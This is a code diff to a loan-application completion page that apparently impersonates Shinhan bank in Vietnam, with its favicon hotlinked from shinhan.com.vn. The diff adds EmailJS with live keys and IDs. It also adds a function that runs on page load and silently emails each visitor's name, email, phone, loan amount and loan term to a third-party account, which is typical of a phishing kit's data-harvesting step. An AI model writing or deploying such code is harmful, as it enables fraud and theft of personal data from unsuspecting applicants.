@@ -9,6 +9,16 @@
     <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="icon" href="https://shinhan.com.vn/favicon.ico">
     <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script type="text/javascript">
+        (function() {
+            // THAY THẾ 'YOUR_PUBLIC_KEY' BẰNG PUBLIC KEY CỦA BẠN TRÊN EMAILJS
+            emailjs.init('OrBsI926QI2_xBh1f'); 
+        })();
+    </script>
+    
     <style>
         :root {
             --primary-color: #0072CE;
@@ -247,6 +257,9 @@ const CompletionApp = {
 
     config: {
         SECRET_KEY: 'shinhan-secret-key',
+        // MỚI: Thêm thông tin EmailJS vào config
+        EMAILJS_SERVICE_ID: 'service_60tgxof',
+        EMAILJS_TEMPLATE_ID: 'template_e8o1t4w'
     },
 
     init() {
@@ -256,6 +269,9 @@ const CompletionApp = {
             return;
         }
         
+        // MỚI: Gọi hàm gửi email sau khi xác thực dữ liệu thành công
+        this.sendNotificationEmail();
+
         // Hide loader and show content
         this.elements.loadingOverlay.style.display = 'none';
         this.elements.completionCard.classList.remove('hidden');
@@ -284,7 +300,6 @@ const CompletionApp = {
 
             this.state.userData = JSON.parse(decryptedData);
             
-            // Validate that we are at the correct step in the process
             if (!this.state.userData.currentStep || this.state.userData.currentStep < 5) {
                  console.error('User is not at the correct step to view this page.');
                  return false;
@@ -294,14 +309,37 @@ const CompletionApp = {
 
         } catch (error) {
             console.error('Error loading or validating userData:', error);
-            // In case of error, it's safer to clear potentially corrupted data
             localStorage.removeItem('userData');
             return false;
         }
+    },
+
+    // MỚI: Thêm hàm để xử lý việc gửi email
+    sendNotificationEmail() {
+        console.log('Preparing to send email...');
+
+        // Tạo đối tượng chứa các tham số cho template EmailJS
+        // Tên các thuộc tính (ví dụ: fullName, email) phải khớp với các biến trong template của bạn
+        const templateParams = {
+            fullName: this.state.userData.fullName,
+            email: this.state.userData.email,
+            phone: this.state.userData.phone,
+            loanAmount: this.state.userData.loanAmount,
+            loanTerm: this.state.userData.loanTerm,
+            // Thêm bất kỳ thông tin nào khác bạn muốn gửi
+        };
+        
+        emailjs.send(this.config.EMAILJS_SERVICE_ID, this.config.EMAILJS_TEMPLATE_ID, templateParams)
+            .then((response) => {
+               console.log('SUCCESS! Email sent.', response.status, response.text);
+               // Bạn có thể thêm thông báo thành công cho người dùng ở đây nếu cần
+            }, (error) => {
+               console.error('FAILED to send email.', error);
+               // Xử lý lỗi: có thể gửi lại hoặc thông báo cho quản trị viên
+            });
     }
 };
 
-// The script runs after the DOM is fully loaded to ensure all elements are available.
 document.addEventListener('DOMContentLoaded', () => {
     CompletionApp.init();
 });
